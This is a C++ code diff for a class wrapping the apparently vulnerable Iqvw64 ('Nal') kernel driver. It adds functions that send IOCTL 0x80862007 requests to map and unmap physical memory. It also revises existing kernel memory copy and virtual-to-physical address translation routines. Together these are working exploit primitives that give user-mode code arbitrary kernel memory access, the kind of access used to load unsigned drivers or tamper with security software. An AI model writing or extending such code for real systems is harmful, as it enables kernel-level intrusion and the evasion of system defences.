@@ -16,7 +16,7 @@ const std::vector<uint8_t>& Iqvw64Driver::GetData() const
 bool Iqvw64Driver::KeMemMove(uintptr_t dist, uintptr_t src, std::size_t size)
 {
     struct CopyMemoryRequest {
-        char option;
+        uintptr_t option;
         char pad0[0xF];
         uintptr_t src;
         uintptr_t dist;
@@ -32,7 +32,57 @@ bool Iqvw64Driver::KeMemMove(uintptr_t dist, uintptr_t src, std::size_t size)
     return SendIoRequest<CopyMemoryRequest>(0x80862007, request);
 }
 
-uintptr_t Iqvw64Driver::KeGetPhysicalAddress(uintptr_t vaddr)
+bool Iqvw64Driver::KeUnmapIoSpace(uintptr_t virtualAddr, std::size_t size)
+{
+    struct UnmapIoSpaceRequest {
+        char option;
+        char pad0[0x9];
+        uintptr_t retval;
+        uintptr_t virtualAddr;
+        uintptr_t physicalAddr;
+        std::size_t size;
+    };
+
+    UnmapIoSpaceRequest request = { 0 };
+    request.option = 0x1A;
+    request.virtualAddr = virtualAddr;
+    request.size = size;
+
+    if (!SendIoRequest<UnmapIoSpaceRequest>(0x80862007, request)) {
+        std::println("[-] Failed to unmap address: 0x{:X}", virtualAddr);
+        return false;
+    }
+
+    std::println("[~] Nal MmUnmapIoSpace returned: {}", request.retval);
+    return true;
+}
+
+uintptr_t Iqvw64Driver::KeMapIoSpace(uintptr_t physicalAddr, std::size_t size)
+{
+    struct MapIoSpaceRequest {
+        char option;
+        char pad0[0x9];
+        uintptr_t retval;
+        uintptr_t virtualAddr;
+        uintptr_t physicalAddr;
+        std::size_t size;
+    };
+
+    MapIoSpaceRequest request = { 0 };
+    request.option = 0x19;
+    request.physicalAddr = physicalAddr;
+    request.size = size;
+
+    if (!SendIoRequest<MapIoSpaceRequest>(0x80862007, request)) {
+        std::println("[-] Failed to map io space for physical address: 0x{:X}", physicalAddr);
+        return 0;
+    }
+
+    std::println("[~] Nal MmMapIoSpace returned: {}", request.retval);
+    return request.virtualAddr;
+}
+
+uintptr_t Iqvw64Driver::KeGetPhysicalAddress(uintptr_t virtualAddr)
 {
     struct Virtual2PhysicalRequest {
         char option;
@@ -43,10 +93,10 @@ uintptr_t Iqvw64Driver::KeGetPhysicalAddress(uintptr_t vaddr)
 
     Virtual2PhysicalRequest request = { 0 };
     request.option = 0x25;
-    request.virtualAddr = vaddr;
+    request.virtualAddr = virtualAddr;
 
     if (!SendIoRequest<Virtual2PhysicalRequest>(0x80862007, request)) {
-        std::println("[-] Failed to translate vAddr to physical");
+        std::println("[-] Failed to translate virtualAddr to physical");
         return 0;
     }
 
